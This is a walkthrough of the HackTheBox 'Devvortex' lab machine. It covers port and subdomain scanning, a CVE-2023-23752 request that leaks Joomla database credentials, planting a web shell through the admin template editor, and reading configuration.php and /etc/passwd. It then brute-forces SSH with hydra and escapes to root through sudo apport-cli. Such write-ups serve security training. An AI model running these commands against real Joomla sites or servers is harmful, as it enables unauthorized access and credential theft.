---
title: "Devvortex machine on HTB"
classes: wide
header:  
  teaser: /assets/images/posts/writeups/devvortex.jpg
  #overlay_image: /assets/images/main/header3.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Devvortex is an easy machine containing a vulnerable version of the known Joomla CMS. All you have to do is to crack the machine and get the flags :)"
description: "Walkthrough on Devvortex machine from HackTheBox"
categories:
  - writeups
tags:
  - joomla
  - CMS
  - curl
  - HTB
  - CTF
  - subdomain
  - writeup
  - HackTheBox
  - Easy
toc: false
---
# Ignite CTF

<img src="/assets/images/posts/writeups/devvortex.jpg" alt="Devvortex" width="500" class="align-center">

Devvortex is an easy machine containing a vulnerable version of the known Joomla CMS. All you have to do is to crack the machine and get the flags :)

## Information gathering

### Enumeration

#### nmap

Command:
```sh
nmap -sV -sC -p- 10.10.11.242 
```

Results
```sh
Host is up (0.055s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DevVortex
18037/tcp filtered unknown
18999/tcp filtered unknown
23756/tcp filtered unknown
31025/tcp filtered unknown
33389/tcp filtered unknown
36830/tcp filtered unknown
45341/tcp filtered unknown
```

**Add domain devvortex.htb to /etc/hosts**

#### ffuf

Command:
```sh
ffuf -c -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -mc 200
```

Results
```sh
dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 317ms]
:: Progress: [20000/20000] :: Job [1/1] :: 334 req/sec :: Duration: [0:00:42] :: Errors: 0 ::

```

Add newly discovered subdomain dev.devvortex.htb to /etc/hosts!!!
#### gobuster

Command:
```sh
gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
```

Results
```sh
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/home                 (Status: 200) [Size: 23221]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/cli                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cli/]
```

## Exploitation
1. Checking the website we can see is running joomla CMS
2. Look in the manifest folder for joomla.xml to get running version
```sh
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml

<extension type="file" method="upgrade">
<name>files_joomla</name>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>(C) 2019 Open Source Matters, Inc.</copyright>
<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
<version>4.2.6</version>
<creationDate>2022-12</creationDate>
<description>FILES_JOOMLA_XML_DESCRIPTION</description>
<scriptfile>administrator/components/com_admin/script.php</scriptfile>
<update>
<schemas>
<schemapath type="mysql">administrator/components/com_admin/sql/updates/mysql</schemapath>
<schemapath type="postgresql">administrator/components/com_admin/sql/updates/postgresql</schemapath>
</schemas>
</update>
<fileset>
<files>
<folder>administrator</folder>
<folder>api</folder>
<folder>cache</folder>
<folder>cli</folder>
<folder>components</folder>
<folder>images</folder>
<folder>includes</folder>
<folder>language</folder>
<folder>layouts</folder>
<folder>libraries</folder>
<folder>media</folder>
<folder>modules</folder>
<folder>plugins</folder>
<folder>templates</folder>
<folder>tmp</folder>
<file>htaccess.txt</file>
<file>web.config.txt</file>
<file>LICENSE.txt</file>
<file>README.txt</file>
<file>index.php</file>
</files>
</fileset>
<updateservers>
<server name="Joomla! Core" type="collection">https://update.joomla.org/core/list.xml</server>
</updateservers>
</extension>
```
3. Check for vulnerabilities on joomla version 4.2.6 or in range. CVE-2023-23752 is an authentication bypass resulting in an information leak: https://vulncheck.com/blog/joomla-for-rce
4. Run the curl command to check if you can get more info
```sh
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```
```json
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb left intact
:{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}   
```

### Foothold
1. Inspecting the JSON file we get one user and password: **lewis/P4ntherg0t1n5r3c0n##**
2. Use  the admin interface to login http://dev.devvortex.htb/administrator/index.php
3. Modify the template files and add a new file to insert a web-shell (use: https://github.com/flozz/p0wny-shell/blob/master/shell.php )
4. Check data in site structure - NOT USEFULL!
```sh
www-data@devvortex:…/www/dev.devvortex.htb# cat configuration.php
<?php
class JConfig {
	public $offline = false;
	public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
	public $display_offline_message = 1;
	public $offline_image = '';
	public $sitename = 'Development';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = 20;
	public $access = 1;
	public $debug = false;
	public $debug_lang = false;
	public $debug_lang_const = true;
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'lewis';
	public $password = 'P4ntherg0t1n5r3c0n##';
	public $db = 'joomla';
	public $dbprefix = 'sd4fg_';
	public $dbencryption = 0;
	public $dbsslverifyservercert = false;
	public $dbsslkey = '';
	public $dbsslcert = '';
	public $dbsslca = '';
	public $dbsslcipher = '';
	public $force_ssl = 0;
	public $live_site = '';
	public $secret = 'ZI7zLTbaGKliS9gq';
	public $gzip = false;
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
	public $offset = 'UTC';
	public $mailonline = true;
	public $mailer = 'mail';
	public $mailfrom = 'lewis@devvortex.htb';
	public $fromname = 'Development';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = false;
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = 25;
	public $caching = 0;
	public $cache_handler = 'file';
	public $cachetime = 15;
	public $cache_platformprefix = false;
	public $MetaDesc = '';
	public $MetaAuthor = true;
	public $MetaVersion = false;
	public $robots = '';
	public $sef = true;
	public $sef_rewrite = false;
	public $sef_suffix = false;
	public $unicodeslugs = false;
	public $feed_limit = 10;
	public $feed_email = 'none';
	public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
	public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
	public $lifetime = 15;
	public $session_handler = 'database';
	public $shared_session = false;
	public $session_metadata = true;
}
```
5. Check /etc/passwd file:
```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
logan:x:1000:1000:,,,:/home/logan:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```
6. Use hydra to bruteforce SSH login for user logan. Password found: **tequieromucho**
```sh
hydra -l logan -P /usr/share/wordlists/rockyou.txt 10.10.11.242 ssh 
```
#### Data exfiltration
1. Login SSH and get user flag from /home/logan/user.txt: **[UserFlag]**

### Privilege escalation
1. SSH login and check possible escalation method:
```sh
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```
2. Use app on a crush report from /var/crash file
```sh
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_apport-cli.0.crash
```
3. When prompted provide *V* option
4. Run *!/bin/bash* - now you are root
#### Data exfiltration
1. Get root flag from /root/root.txt: **[RootFlag]**